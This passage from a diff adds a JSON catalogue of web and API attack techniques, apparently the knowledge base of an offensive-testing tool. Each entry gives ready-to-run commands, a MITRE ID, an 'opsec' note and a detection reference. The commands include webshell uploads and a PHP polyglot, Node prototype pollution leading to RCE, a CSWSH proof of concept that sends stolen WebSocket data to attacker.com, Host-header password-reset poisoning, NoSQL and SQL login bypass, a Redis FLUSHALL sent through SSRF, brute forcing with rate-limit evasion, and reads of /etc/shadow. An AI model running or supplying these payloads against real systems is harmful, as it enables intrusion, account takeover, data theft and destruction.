+    "opsec": "Open redirect for phishing uses target company's trusted domain in URL. Combine with OAuth flows for more impactful token theft.",
+    "detection_ref": "Redirect destination validation; allowlist of valid redirect targets; user awareness for phishing via open redirects"
+  },
+  "file_upload_attacks": {
+    "description": "Exploiting file upload functionality to achieve code execution.",
+    "commands": [
+      {
+        "description": "Upload PHP webshell with content-type bypass.",
+        "method": "curl",
+        "command": "curl -X POST {url}/upload -F 'file=@shell.php;type=image/jpeg' -b {cookie}"
+      },
+      {
+        "description": "Upload webshell with double extension bypass.",
+        "method": "curl",
+        "command": "curl -X POST {url}/upload -F 'file=@shell.php.jpg' -b {cookie}"
+      },
+      {
+        "description": "Upload PHP webshell with null byte truncation.",
+        "method": "curl",
+        "command": "curl -X POST {url}/upload -F 'file=@shell.php%00.jpg' -b {cookie}"
+      },
+      {
+        "description": "IIS ASPX webshell upload.",
+        "method": "curl",
+        "command": "curl -X POST {url}/upload -F 'file=@shell.aspx;type=image/png' -b {cookie}"
+      },
+      {
+        "description": "Polyglot file — valid image AND valid PHP.",
+        "method": "shell",
+        "command": "exiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' benign.jpg -o polyglot.php.jpg"
+      }
+    ],
+    "mitre": "T1190",
+    "prerequisites": "File upload endpoint; insufficient MIME/extension validation; web-accessible upload directory",
+    "opsec": "Bypass extension checks: double extension (.php.jpg), null byte (.php%00.jpg), content-type override. Polyglot files (JPEG+PHP). Web shell in exif data.",
+    "detection_ref": "Server-side MIME validation (magic bytes); upload directory execution prevention; file extension allowlisting; AV scanning on upload"
+  },
+  "prototype_pollution": {
+    "description": "Testing and exploiting JavaScript prototype pollution vulnerabilities.",
+    "commands": [
+      {
+        "description": "Test prototype pollution via query string.",
+        "method": "curl",
+        "command": "curl '{url}?__proto__[polluted]=yes' && curl '{url}?constructor[prototype][polluted]=yes'"
+      },
+      {
+        "description": "Prototype pollution via JSON body.",
+        "method": "curl",
+        "command": "curl -X POST {url}/api/settings -H 'Content-Type: application/json' -d '{\"__proto__\":{\"polluted\":true}}'"
+      },
+      {
+        "description": "Exploit prototype pollution for privilege escalation in Node.js.",
+        "method": "Manual",
+        "command": "# If app checks user.isAdmin: POST /profile -d '{\"__proto__\":{\"isAdmin\":true}}' then GET /admin"
+      },
+      {
+        "description": "Detect prototype pollution with pp-finder Chrome extension.",
+        "method": "Manual",
+        "command": "# Browser devtools: Object.prototype.polluted — if returns true after sending payload, prototype is polluted"
+      },
+      {
+        "description": "Server-side prototype pollution RCE via child_process.",
+        "method": "Manual",
+        "command": "# Node.js: POST /config -d '{\"__proto__\":{\"shell\":\"node\",\"NODE_OPTIONS\":\"--inspect={lhost}:1337\"}}' — triggers debugger RCE on next spawn"
+      }
+    ],
+    "mitre": "T1059.007",
+    "prerequisites": "JavaScript/Node.js application; object property merging without prototype sanitization; prototype chain accessible",
+    "opsec": "Server-side prototype pollution can lead to RCE in Node.js. Client-side affects browser behavior. Property enumeration confirms injection.",
+    "detection_ref": "Object.freeze(Object.prototype) mitigation; library patching (lodash, jQuery); SAST for prototype pollution patterns; prototype access auditing"
+  },
+  "graphql_attacks": {
+    "description": "Advanced GraphQL security testing beyond basic introspection.",
+    "commands": [
+      {
+        "description": "GraphQL introspection bypass when disabled — alias batching trick.",
+        "method": "curl",
+        "command": "curl -X POST {url}/graphql -d '{\"query\":\"{__type(name:\\\"Query\\\"){name fields{name type{name}}}}\"}'"
+      },
+      {
+        "description": "GraphQL DoS via deeply nested query (query depth attack).",
+        "method": "curl",
+        "command": "curl -X POST {url}/graphql -d '{\"query\":\"{users{friends{friends{friends{friends{friends{name}}}}}}}\"}'"
+      },
+      {
+        "description": "GraphQL batching attack — send 1000 mutations in single request.",
+        "method": "Python",
+        "command": "import requests; queries=[{'query':'mutation{login(user:\"admin\",pass:\"%s\"){token}}' % p} for p in open('passwords.txt')]; requests.post('{url}/graphql',json=queries)"
+      },
+      {
+        "description": "GraphQL IDOR — access other users' data via direct ID reference.",
+        "method": "curl",
+        "command": "curl -X POST {url}/graphql -d '{\"query\":\"{user(id:\\\"2\\\"){email,password,token}}\"}' -H 'Authorization: Bearer {your_token}'"
+      },
+      {
+        "description": "GraphQL subscription for real-time data leakage.",
+        "method": "wscat",
+        "command": "wscat -c ws://{url}/graphql/subscriptions -x '{\"type\":\"start\",\"payload\":{\"query\":\"subscription{newUsers{email,password}}\"}'"
+      }
+    ],
+    "mitre": "T1595",
+    "prerequisites": "GraphQL endpoint accessible; introspection enabled; target queries/mutations identified",
+    "opsec": "GraphQL introspection reveals full API schema. Batching queries for enumeration. Nested query depth attacks can DoS GraphQL servers.",
+    "detection_ref": "Disable introspection in production; query depth limiting; query complexity analysis; GraphQL WAF rules; field-level authorization"
+  },
+  "cache_poisoning": {
+    "description": "Testing web cache poisoning vulnerabilities in CDN and reverse proxy caches.",
+    "commands": [
+      {
+        "description": "Detect cache keys and unkeyed headers with Param Miner.",
+        "method": "Burp",
+        "command": "# Burp > Param Miner > Guess headers — automatically discovers unkeyed request headers"
+      },
+      {
+        "description": "Cache poison via X-Forwarded-Host header.",
+        "method": "curl",
+        "command": "curl -H 'X-Forwarded-Host: evil.com' {url}/resource -I | grep -i 'X-Cache\\|Age'"
+      },
+      {
+        "description": "Cache deception — trick cache to store user-specific response for public URL.",
+        "method": "curl",
+        "command": "curl '{url}/api/user/profile.css' -b {session_cookie} # Cache stores authenticated response at guessable URL"
+      },
+      {
+        "description": "Cache poison via unkeyed query string parameter.",
+        "method": "curl",
+        "command": "curl '{url}/?utm_source=<script>alert(1)</script>' -I && curl '{url}/' # Second request gets poisoned cached response"
+      },
+      {
+        "description": "Fat GET cache poisoning — send body in GET request.",
+        "method": "curl",
+        "command": "curl -X GET {url}/static/app.js -d 'q=<script>alert(document.cookie)</script>' -H 'Content-Length: 40'"
+      }
+    ],
+    "mitre": "T1190",
+    "prerequisites": "Caching layer; unkeyed request headers influence response; target cache shared with multiple users",
+    "opsec": "Use cache buster parameter during testing to avoid affecting other users. Confirm cache poisoning before actual attack. High-impact if CDN-level cache.",
+    "detection_ref": "Cache-Control: no-store for sensitive responses; Vary header for security-relevant headers; CDN security configuration; anomalous cached responses"
+  },
+  "business_logic": {
+    "description": "Testing business logic vulnerabilities — race conditions, negative values, and workflow bypass.",
+    "commands": [
+      {
+        "description": "Race condition attack — send concurrent requests to apply discount twice.",
+        "method": "turbo-intruder",
+        "command": "# Burp Turbo Intruder: engine=Engine.THREADED, concurrentRequests=20 — fire 20 simultaneous POST /apply-coupon requests"
+      },
+      {
+        "description": "Negative price / quantity manipulation.",
+        "method": "curl",
+        "command": "curl -X POST {url}/cart/add -d 'product_id=1&quantity=-100' -b {cookie}"
+      },
+      {
+        "description": "Workflow bypass — skip payment step by directly accessing post-payment URL.",
+        "method": "curl",
+        "command": "curl '{url}/order/confirmation?order_id={order_id}' -b {cookie} # Skip /checkout/payment step entirely"
+      },
+      {
+        "description": "Mass assignment — submit unlisted fields in registration.",
+        "method": "curl",
+        "command": "curl -X POST {url}/api/users -d '{\"username\":\"user\",\"password\":\"pass\",\"role\":\"admin\",\"isAdmin\":true}'"
+      },
+      {
+        "description": "Forced browsing — access admin functions without authorization check.",
+        "method": "curl",
+        "command": "curl '{url}/admin/delete-user?id=victim123' -b {unprivileged_cookie}"
+      }
+    ],
+    "mitre": "T1078",
+    "prerequisites": "Understanding of application business rules; authenticated access to test workflows",
+    "opsec": "Business logic flaws are unique to each application — no automated tools. Manual testing of edge cases. Negative values, step skipping, and parameter manipulation.",
+    "detection_ref": "Server-side state machine validation; business rule enforcement in code review; anomaly detection for unusual transaction patterns"
+  },
+  "subdomain_takeover": {
+    "description": "Identifying and exploiting subdomain takeover vulnerabilities.",
+    "commands": [
+      {
+        "description": "Find dangling DNS CNAMEs pointing to cloud services.",
+        "method": "subjack",
+        "command": "subjack -w subdomains.txt -t 100 -o takeovers.txt -ssl -c fingerprints.json"
+      },
+      {
+        "description": "Check for takeover-vulnerable Azure services.",
+        "method": "dnsx",
+        "command": "dnsx -l subdomains.txt -cname -resp | grep 'azurewebsites\\|cloudapp\\|trafficmanager'"
+      },
+      {
+        "description": "Enumerate subdomains for takeover candidates.",
+        "method": "subfinder",
+        "command": "subfinder -d {domain} -silent | dnsx -cname -resp -silent | anew cnames.txt"
+      },
+      {
+        "description": "Check if abandoned GitHub Pages domain is takeable.",
+        "method": "curl",
+        "command": "curl -s https://{subdomain} | grep -i 'There isn.t a GitHub Pages site here'"
+      },
+      {
+        "description": "S3 bucket subdomain takeover — claim unclaimed bucket matching CNAME.",
+        "method": "aws",
+        "command": "aws s3api create-bucket --bucket {subdomain_cname_value} --region {region} # Claim matching bucket name"
+      }
+    ],
+    "mitre": "T1584.001",
+    "prerequisites": "Dangling DNS CNAME pointing to unclaimed third-party service (GitHub Pages, Heroku, S3)",
+    "opsec": "Subdomain takeover requires claiming the third-party resource. Passive discovery via subdomain enumeration + DNS resolution. Very low noise.",
+    "detection_ref": "DNS CNAME audit for dangling records; regular subdomain inventory; monitoring third-party service deletions; automated subdomain takeover scanning"
+  },
+  "websocket_attacks": {
+    "description": "Testing WebSocket endpoints for injection, authentication bypass, and data exposure.",
+    "commands": [
+      {
+        "description": "Connect to WebSocket endpoint.",
+        "method": "wscat",
+        "command": "wscat -c ws://{url}/ws -H 'Cookie: {session_cookie}'"
+      },
+      {
+        "description": "Test WebSocket for SQL injection via message payload.",
+        "method": "wscat",
+        "command": "wscat -c ws://{url}/api -x '{\"query\":\"1' OR '1'='1\"}'"
+      },
+      {
+        "description": "WebSocket cross-site hijacking (CSWSH) PoC.",
+        "method": "Manual",
+        "command": "// Host on attacker.com: var ws=new WebSocket('wss://{target}/ws'); ws.onmessage=function(e){fetch('https://attacker.com/?d='+btoa(e.data))};"
+      },
+      {
+        "description": "Replay captured WebSocket authentication message.",
+        "method": "wscat",
+        "command": "wscat -c ws://{url}/ws -x '{\"type\":\"auth\",\"token\":\"{stolen_token}\"}'"
+      },
+      {
+        "description": "Fuzz WebSocket message structure.",
+        "method": "Burp",
+        "command": "# Burp > Proxy > WebSockets history — right click message > Send to Repeater > modify payload fields"
+      }
+    ],
+    "mitre": "T1190",
+    "prerequisites": "WebSocket endpoint; authentication bypass or injection in message handling",
+    "opsec": "WebSocket messages often not logged at same fidelity as HTTP. CSWSH (cross-site WebSocket hijacking) requires victim interaction. Message injection is real-time.",
+    "detection_ref": "WebSocket message validation; CSRF protection for WebSocket handshake; Origin header validation; WebSocket proxy logging"
+  },
+  "host_header_attacks": {
+    "description": "Exploiting Host header injection for password reset poisoning and cache attacks.",
+    "commands": [
+      {
+        "description": "Password reset poisoning via Host header injection.",
+        "method": "curl",
+        "command": "curl -X POST {url}/forgot-password -H 'Host: attacker.com' -d 'email=victim@{target}'"
+      },
+      {
+        "description": "Host header override via X-Forwarded-Host.",
+        "method": "curl",
+        "command": "curl -H 'X-Forwarded-Host: attacker.com' {url}/reset-password -d 'email=admin@{target}'"
+      },
+      {
+        "description": "Absolute URL bypass — send absolute URL in request line.",
+        "method": "Manual",
+        "command": "GET http://attacker.com/path HTTP/1.1\\r\\nHost: vulnerable.com\\r\\n\\r\\n"
+      },
+      {
+        "description": "Ambiguous host header — inject second Host header.",
+        "method": "Manual",
+        "command": "GET / HTTP/1.1\\r\\nHost: vulnerable.com\\r\\nHost: attacker.com\\r\\n\\r\\n"
+      },
+      {
+        "description": "Host header port injection to manipulate links.",
+        "method": "curl",
+        "command": "curl -H 'Host: vulnerable.com:@attacker.com' {url}/email-confirmation"
+      }
+    ],
+    "mitre": "T1190",
+    "prerequisites": "Application trusting Host header for routing, password reset links, or cache keying",
+    "opsec": "Password reset poisoning via Host header modification — target receives reset link to attacker-controlled host. Cache poisoning via unkeyed Host header.",
+    "detection_ref": "Host header validation against allowlist; absolute URL generation with configured base URL; X-Forwarded-Host header stripping at proxy"
+  },
+  "api_authentication_attacks": {
+    "description": "API-specific authentication and authorization vulnerabilities.",
+    "mitre": "T1078",
+    "commands": [
+      {
+        "description": "Brute force API key via header enumeration.",
+        "method": "ffuf",
+        "command": "ffuf -u {url}/api/data -H 'X-API-Key: FUZZ' -w api_keys.txt -mc 200"
+      },
+      {
+        "description": "Test API with no authentication header — missing auth check.",
+        "method": "curl",
+        "command": "curl {url}/api/v1/admin/users -v # Drop all auth headers — check if endpoint unprotected"
+      },
+      {
+        "description": "JWT algorithm confusion attack (RS256 to HS256).",
+        "method": "Python",
+        "command": "# Get server's RSA public key, sign JWT with HMAC using public key as secret, change alg to HS256"
+      },
+      {
+        "description": "JWT kid header path traversal.",
+        "method": "Manual",
+        "command": "# Modify JWT header: {\"alg\":\"HS256\",\"kid\":\"../../dev/null\"} — sign with empty string as secret"
+      },
+      {
+        "description": "Test API key in URL parameter (insecure placement).",
+        "method": "curl",
+        "command": "curl '{url}/api/resource?api_key={leaked_key}&action=admin'"
+      }
+    ],
+    "prerequisites": "API with weak authentication (JWT, API keys, OAuth); credential list or JWT with known secret",
+    "opsec": "JWT none algorithm or weak secret brute force. API key enumeration via mass registration. Token leakage in logs/URLs. Single targeted test per vector.",
+    "detection_ref": "Strong JWT secret requirements; API key rotation policies; token leakage scanning in code/logs; anomalous API authentication patterns"
+  },
+  "api_idor": {
+    "description": "Insecure Direct Object Reference testing specific to API endpoints.",
+    "mitre": "T1078",
+    "commands": [
+      {
+        "description": "IDOR via sequential ID increment.",
+        "method": "ffuf",
+        "command": "ffuf -u {url}/api/v1/users/FUZZ/profile -w <(seq 1 10000) -mc 200 -H 'Authorization: Bearer {token}'"
+      },
+      {
+        "description": "IDOR via GUID/UUID — test known UUIDs from other API responses.",
+        "method": "curl",
+        "command": "curl {url}/api/invoices/{other_user_guid} -H 'Authorization: Bearer {your_token}'"
+      },
+      {
+        "description": "Mass IDOR via batch API endpoint.",
+        "method": "curl",
+        "command": "curl -X POST {url}/api/users/batch -d '{\"ids\":[1,2,3,4,5,100,101,102]}' -H 'Authorization: Bearer {token}'"
+      },
+      {
+        "description": "Horizontal privilege escalation via account parameter.",
+        "method": "curl",
+        "command": "curl {url}/api/account?user_id={other_user_id} -b {your_session_cookie}"
+      },
+      {
+        "description": "IDOR in file download endpoint.",
+        "method": "ffuf",
+        "command": "ffuf -u '{url}/api/files/FUZZ/download' -w file_ids.txt -mc 200 -H 'Authorization: Bearer {token}' -o idor_results.json"
+      }
+    ],
+    "prerequisites": "API endpoints with object references; authorization not validated server-side for each request",
+    "opsec": "Sequential ID enumeration in API responses. Replace user IDs with victim IDs. Test both horizontal and vertical privilege escalation.",
+    "detection_ref": "Authorization checks on every API object access; indirect object references; anomalous cross-user resource access monitoring"
+  },
+  "api_rate_limit_bypass": {
+    "description": "Bypassing API rate limiting for brute force and enumeration.",
+    "mitre": "T1110",
+    "commands": [
+      {
+        "description": "Rotate IP via X-Forwarded-For to bypass IP-based rate limits.",
+        "method": "ffuf",
+        "command": "ffuf -u {url}/api/login -X POST -d '{\"user\":\"admin\",\"pass\":\"FUZZ\"}' -w passwords.txt -H 'X-Forwarded-For: FUZZ2' -w2 ips.txt"
+      },
+      {
+        "description": "Bypass rate limit via X-Real-IP header spoofing.",
+        "method": "curl",
+        "command": "curl -X POST {url}/api/verify-otp -H 'X-Real-IP: {random_ip}' -d '{\"code\":\"1234\"}'"
+      },
+      {
+        "description": "Null byte or case variation to bypass rate limit per-endpoint tracking.",
+        "method": "ffuf",
+        "command": "ffuf -u '{url}/api/login%20' -X POST -w passwords.txt -d '{\"user\":\"admin\",\"pass\":\"FUZZ\"}'"
+      },
+      {
+        "description": "Distribute brute force across multiple accounts (low-and-slow).",
+        "method": "Python",
+        "command": "# Rotate through user list with 1 attempt per account per minute: for user in users: try_login(user, next(passwords)); sleep(60)"
+      },
+      {
+        "description": "Race condition bypass — send burst before rate limit counter increments.",
+        "method": "turbo-intruder",
+        "command": "# Burp Turbo Intruder: send 50 simultaneous OTP attempts before server's per-second counter locks account"
+      }
+    ],
+    "prerequisites": "API with rate limiting; bypass technique applicable (header rotation, IP rotation, distributed requests)",
+    "opsec": "X-Forwarded-For header bypass if server uses it for rate limiting. Slow enumeration over time avoids threshold triggers. Distribute across multiple IPs.",
+    "detection_ref": "Rate limiting at API gateway (not header-based); IP-based AND user-based rate limiting; anomaly detection for distributed credential stuffing"
+  },
+  "api_mass_assignment": {
+    "description": "Testing REST APIs for mass assignment and parameter binding vulnerabilities.",
+    "mitre": "T1078",
+    "commands": [
+      {
+        "description": "Add admin role via mass assignment in user creation.",
+        "method": "curl",
+        "command": "curl -X POST {url}/api/users/register -H 'Content-Type: application/json' -d '{\"username\":\"attacker\",\"password\":\"P@ss\",\"role\":\"admin\",\"admin\":true,\"isActive\":true}'"
+      },
+      {
+        "description": "Elevate privileges on profile update endpoint.",
+        "method": "curl",
+        "command": "curl -X PUT {url}/api/users/me -H 'Authorization: Bearer {token}' -d '{\"name\":\"Attacker\",\"email\":\"x@x.com\",\"role\":\"superadmin\",\"credit\":9999}'"
+      },
+      {
+        "description": "Test mass assignment on nested objects.",
+        "method": "curl",
+        "command": "curl -X POST {url}/api/orders -d '{\"item_id\":1,\"quantity\":1,\"price\":0.01,\"status\":\"completed\",\"payment\":{\"verified\":true}}'"
+      },
+      {
+        "description": "Discover hidden fields via API schema — look for undocumented fields in responses.",
+        "method": "curl",
+        "command": "curl {url}/api/users/{id} -H 'Authorization: Bearer {admin_token}' | jq 'keys' # Compare admin vs user response fields"
+      },
+      {
+        "description": "Exploit mass assignment to set password of other user.",
+        "method": "curl",
+        "command": "curl -X PATCH {url}/api/users/{other_user_id} -d '{\"password\":\"hacked\"}' -H 'Authorization: Bearer {your_token}'"
+      }
+    ],
+    "prerequisites": "API accepting and binding all request body parameters to object model; privileged fields not explicitly excluded",
+    "opsec": "Add admin=true, role=admin, verified=true to request bodies. API docs or Swagger reveal available fields. Fuzz extra parameters against schema.",
+    "detection_ref": "Explicit allowlisting of accepted parameters; DTOs (Data Transfer Objects) without auto-binding; security testing for mass assignment in SDLC"
+  },
+  "api_injection": {
+    "description": "Injection attacks specific to API endpoints — NoSQL, command, LDAP, and header injection.",
+    "mitre": "T1190",
+    "commands": [
+      {
+        "description": "NoSQL injection in JSON API body.",
+        "method": "curl",
+        "command": "curl -X POST {url}/api/login -H 'Content-Type: application/json' -d '{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}'"
+      },
+      {
+        "description": "OS command injection via API parameter.",
+        "method": "curl",
+        "command": "curl '{url}/api/ping?host=127.0.0.1;id' -H 'Authorization: Bearer {token}'"
+      },
+      {
+        "description": "LDAP injection in API search endpoint.",
+        "method": "curl",
+        "command": "curl '{url}/api/users/search?q=*)(|(cn=*)' -H 'Authorization: Bearer {token}'"
+      },
+      {
+        "description": "Header injection via API response manipulation.",
+        "method": "curl",
+        "command": "curl '{url}/api/redirect?url=https://evil.com%0d%0aSet-Cookie:session=evil'"
+      },
+      {
+        "description": "CRLF injection in API endpoint to split response.",
+        "method": "curl",
+        "command": "curl '{url}/api/data?param=value%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>'"
+      }
+    ],
+    "prerequisites": "API passing user input to backend systems (SQL, NoSQL, OS commands, LDAP) without sanitization",
+    "opsec": "Same injection techniques as web apps but in API context. JSON body injection, header injection, parameter pollution. Error messages often more verbose in APIs.",
+    "detection_ref": "Parameterized queries for all DB interaction; input validation at API gateway; SAST for injection vulnerabilities; WAF API protection mode"
+  },
+  "api_versioning_abuse": {
+    "description": "Exploiting API versioning — deprecated endpoints, version bypass, and undocumented versions.",
+    "mitre": "T1190",
+    "commands": [
+      {
+        "description": "Enumerate API versions via common paths.",
+        "method": "ffuf",
+        "command": "ffuf -u {url}/FUZZ/users -w api_versions.txt -mc 200,401,403 # wordlist: api,v1,v2,v3,v4,beta,dev,internal,test,staging"
+      },
+      {
+        "description": "Access deprecated API v1 that lacks security controls of v2.",
+        "method": "curl",
+        "command": "curl {url}/api/v1/admin/users -H 'Authorization: Bearer {token}' # v2 may have auth, v1 may not"
+      },
+      {
+        "description": "Test for undocumented internal API endpoints.",
+        "method": "ffuf",
+        "command": "ffuf -u {url}/internal/FUZZ -w api_wordlist.txt -mc 200,302,401 -H 'Host: internal.{target}'"
+      },
+      {
+        "description": "API version bypass via Accept header.",
+        "method": "curl",
+        "command": "curl {url}/api/users -H 'Accept: application/vnd.api.v1+json' -H 'Authorization: Bearer {token}'"
+      },
+      {
+        "description": "Bypass API gateway by calling backend directly via Host manipulation.",
+        "method": "curl",
+        "command": "curl {backend_ip}/api/admin -H 'Host: internal-api.{target}' # Bypass API gateway/WAF by hitting backend directly"
+      }
+    ],
+    "prerequisites": "API with multiple versions; older versions accessible and containing vulnerabilities fixed in newer versions",
+    "opsec": "Test /v1/, /v2/, /api/v1/, /api/2022-01-01/ etc. Older versions often lack security controls added to current version.",
+    "detection_ref": "Deprecate and remove old API versions; version usage monitoring; security testing across all active versions; API versioning policy"
+  },
+  "api_graphql_advanced": {
+    "description": "Advanced GraphQL attack techniques beyond basic enumeration.",
+    "mitre": "T1190",
+    "commands": [
+      {
+        "description": "GraphQL field suggestion enumeration (dev mode leaks field names).",
+        "method": "curl",
+        "command": "curl -X POST {url}/graphql -d '{\"query\":\"{user{passw}}\"}' # Typo triggers Did you mean: password suggestion"
+      },
+      {
+        "description": "GraphQL query aliasing to bypass rate limits.",
+        "method": "curl",
+        "command": "curl -X POST {url}/graphql -d '{\"query\":\"{a1:user(id:1){pass} a2:user(id:2){pass} a3:user(id:3){pass}}\"}'"
+      },
+      {
+        "description": "GraphQL SSRF via URL-accepting field.",
+        "method": "curl",
+        "command": "curl -X POST {url}/graphql -d '{\"query\":\"{importFromUrl(url:\\\"http://169.254.169.254/latest/meta-data/\\\"){content}}\"}' "
+      },
+      {
+        "description": "Bypass GraphQL introspection block via __type instead of __schema.",
+        "method": "curl",
+        "command": "curl -X POST {url}/graphql -d '{\"query\":\"{__type(name:\\\"Mutation\\\"){fields{name args{name type{name}}}}}\"}' "
+      }
+    ],
+    "prerequisites": "GraphQL endpoint; introspection enabled; batching queries allowed; depth limiting absent",
+    "opsec": "Introspection reveals full schema. Alias queries for data batching. Nested query depth attacks for DoS. Field-level authorization bypass.",
+    "detection_ref": "Disable introspection in production; query depth and complexity limiting; field-level authorization; GraphQL security audit tools (GraphQL Voyager)"
+  },
+  "api_file_and_path": {
+    "description": "API-specific path traversal, file inclusion, and arbitrary file access vulnerabilities.",
+    "mitre": "T1190",
+    "commands": [
+      {
+        "description": "Path traversal via API file parameter.",
+        "method": "curl",
+        "command": "curl '{url}/api/v1/files/download?path=../../../../etc/passwd' -H 'Authorization: Bearer {token}'"
+      },
+      {
+        "description": "Path traversal via encoded sequences in API.",
+        "method": "curl",
+        "command": "curl '{url}/api/export?file=..%2F..%2F..%2Fetc%2Fshadow' -H 'Authorization: Bearer {token}'"
+      },
+      {
+        "description": "Arbitrary file write via API upload with path in filename.",
+        "method": "curl",
+        "command": "curl -X POST {url}/api/upload -F 'file=@shell.php' -F 'filename=../../webroot/uploads/shell.php' -H 'Authorization: Bearer {token}'"
+      },
+      {
+        "description": "ZIP slip via API archive upload.",
+        "method": "evilarc",
+        "command": "python3 evilarc.py shell.php -o evil.zip -p 'var/www/html/' -d 5"
+      },
+      {
+        "description": "Server-side path traversal in image processing API.",
+        "method": "curl",
+        "command": "curl -X POST {url}/api/image/process -d '{\"url\":\"file:///etc/passwd\"}' -H 'Authorization: Bearer {token}'"
+      }
+    ],
+    "prerequisites": "API endpoint accessing filesystem based on user input; path traversal vulnerability present",
+    "opsec": "APIs often have less WAF protection than web UIs. ../../../etc/passwd via JSON body parameter. URL-encoded and double-encoded traversal sequences.",
+    "detection_ref": "Path normalization before file access; chroot/jail for file operations; file access monitoring; WAF path traversal rules for API endpoints"
+  },
+  "saml_attacks": {
+    "description": "Attacking SAML-based Single Sign-On implementations.",
+    "mitre": "T1606.002",
+    "commands": [
+      {
+        "description": "Decode and inspect SAML assertion from browser traffic.",
+        "method": "shell",
+        "command": "echo '{base64_saml_response}' | base64 -d | xmllint --format -"
+      },
+      {
+        "description": "SAML XML signature wrapping (XSW) — duplicate assertion to bypass signature.",
+        "method": "Manual",
+        "command": "# Copy signed assertion, add unsigned clone with attacker role, move original to extension element. SP processes unsigned clone while verifying signature on original"
+      },
+      {
+        "description": "SAML XXE via malicious XML in assertion.",
+        "method": "Manual",
+        "command": "# Inject in SAML assertion XML: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><samlp:... &xxe; ...>"
+      },
+      {
+        "description": "SAML authentication bypass via comment injection.",
+        "method": "Manual",
+        "command": "# If IdP validates admin<!---->@corp.com as different from admin@corp.com: modify NameID to admin<!---->@corp.com to gain admin session"
+      },
+      {
+        "description": "Test SAML replay — reuse captured assertion before expiry.",
+        "method": "curl",
+        "command": "curl -X POST {url}/saml/acs -d 'SAMLResponse={captured_base64_response}'  # Check if assertion reuse is blocked"
+      }
+    ],
+    "prerequisites": "SAML-based SSO; vulnerable SAML implementation (XML signature wrapping, XXE in assertion, comment injection)",
+    "opsec": "XML signature wrapping adds attacker-controlled elements while keeping valid signature. Single SAML assertion modification. Comment injection in NameID.",
+    "detection_ref": "Schema validation of SAML assertions; strict XML signature validation; canonicalization algorithm enforcement; SAML security audit"
+  },
+  "nosql_injection": {
+    "description": "NoSQL injection attacks against MongoDB, Redis, and other NoSQL databases.",
+    "mitre": "T1190",
+    "commands": [
+      {
+        "description": "MongoDB authentication bypass via $ne operator.",
+        "method": "curl",
+        "command": "curl -X POST {url}/api/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":{\"$ne\":\"x\"}}'"
+      },
+      {
+        "description": "MongoDB data extraction via $regex blind injection.",
+        "method": "Python",
+        "command": "import requests; [print(c) for c in 'abcdefghijklmnopqrstuvwxyz0123456789' if requests.post('{url}/login',json={'user':'admin','pass':{'$regex':'^'+c}}).status_code==200]"
+      },
+      {
+        "description": "MongoDB operator injection via URL parameter.",
+        "method": "curl",
+        "command": "curl '{url}/api/search?user[$ne]=invalid&user[$gt]='  # Array param injection for NoSQL operators"
+      },
+      {
+        "description": "Redis command injection via SSRF + Gopher protocol.",
+        "method": "curl",
+        "command": "curl '{url}?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A'  # FLUSHALL via SSRF to Redis"
+      },
+      {
+        "description": "Elasticsearch injection via JSON query manipulation.",
+        "method": "curl",
+        "command": "curl -X POST {url}/api/search -d '{\"query\":{\"bool\":{\"must\":[{\"match_all\":{}}],\"filter\":[{\"script\":{\"script\":\"doc[\\\"password\\\"].value == \\\"admin\\\"\"}}]}}}'  # Script injection in ES query"
+      }
+    ],
+    "prerequisites": "NoSQL database with unsanitized operator injection; MongoDB/CouchDB/Elasticsearch",
+    "opsec": "MongoDB operator injection ($where, $regex) often bypasses SQL-focused WAFs. Use $gt/$lt for authentication bypass without $where JS execution.",
+    "detection_ref": "Input validation for NoSQL operators; parameterized queries for NoSQL; WAF NoSQL-specific rules; application security testing"
+  },
+  "broken_access_control": {
+    "description": "Exploit broken access control — IDOR, horizontal/vertical privilege escalation, JWT role tampering, and forced browsing.",
+    "mitre": "T1078",
+    "commands": [
+      {
+        "description": "Test for IDOR by iterating user IDs in API requests",
+        "command": "ffuf -u 'https://target.com/api/users/FUZZ/profile' -w /tmp/ids.txt -H 'Authorization: Bearer <token>'",
+        "method": "ffuf"
+      },
+      {
+        "description": "JWT role tampering — modify role claim to admin",
+        "command": "python3 jwt_tool.py <JWT> -T\n# Change role to admin, resign with cracked/known secret",
+        "method": "jwt_tool"
+      },
+      {
+        "description": "JWT algorithm confusion attack (RS256 to HS256 with public key)",
+        "command": "python3 jwt_tool.py <JWT> -X k -pk public.pem",
+        "method": "jwt_tool"
+      },
+      {
+        "description": "Force browse to admin paths with authentication cookie",
+        "command": "ffuf -u 'https://target.com/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302 -H 'Cookie: session=<token>'",
+        "method": "ffuf"
+      },
+      {
+        "description": "Test function-level authorization — call admin API as regular user",
+        "command": "curl -s -X DELETE 'https://target.com/api/admin/users/1337' -H 'Authorization: Bearer <regular_user_token>'",
+        "method": "curl"
+      }
+    ],
+    "prerequisites": "Authenticated session; access control enforcement absent or bypassable server-side",
+    "opsec": "Test every endpoint with lower-privilege token. Force browsing to admin URLs. HTTP method manipulation (GET→POST). Horizontal and vertical escalation.",
+    "detection_ref": "Deny by default authorization; server-side role enforcement; access control unit tests; anomalous endpoint access patterns"
+  },
+  "authentication_bypass": {
+    "description": "Bypass authentication mechanisms — SQL injection login bypass, MFA bypass, JWT none algorithm, and password reset token flaws.",
+    "mitre": "T1190",
+    "commands": [
+      {
+        "description": "SQL injection authentication bypass (classic)",
+        "command": "# Username field: admin'--\n# Password field: anything\n# Or: ' OR '1'='1'-- in username",
+        "method": "SQLi"
+      },
+      {
+        "description": "JWT none algorithm bypass",
+        "command": "python3 jwt_tool.py <JWT> -X a\n# Removes signature, sets alg to none",
+        "method": "jwt_tool"
+      },
+      {
+        "description": "MFA bypass via response manipulation (change verified:false to true)",
+        "command": "# Burp Suite: intercept MFA verification response\n# Change: {\"success\": false, \"mfa_verified\": false}\n# To:     {\"success\": true, \"mfa_verified\": true}",
+        "method": "Burp Suite"
+      },
+      {
+        "description": "Password reset token brute force (weak/short tokens)",
+        "command": "ffuf -u 'https://target.com/reset?token=FUZZ' -w /tmp/tokens.txt -mc 200 -fs 0",
+        "method": "ffuf"
+      },
+      {
+        "description": "Account takeover via host header injection in password reset",
